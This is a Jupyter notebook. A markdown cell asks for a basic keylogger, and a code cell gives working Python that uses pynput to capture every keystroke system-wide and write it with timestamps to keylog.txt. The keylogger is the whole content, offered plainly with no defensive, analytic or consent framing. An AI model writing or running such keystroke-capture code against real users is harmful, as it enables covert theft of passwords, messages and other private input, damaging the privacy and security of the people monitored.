{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Create a basic keylogger program that records and logs keystrokes. Focus on logging the keys pressed and saving them to a file."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "import logging\n",
    "from pynput.keyboard import Key, Listener\n",
    "\n",
    "logging.basicConfig(filename=\"keylog.txt\", level=logging.DEBUG, format=\"%(asctime)s - %(message)s\")\n",
    "\n",
    "def on_press(key):\n",
    "    try:\n",
    "        logging.info(str(key.char))\n",
    "    except AttributeError:\n",
    "        logging.info(str(key))\n",
    "        \n",
    "with Listener(on_press=on_press) as listener:\n",
    "    listener.join()"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.1"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
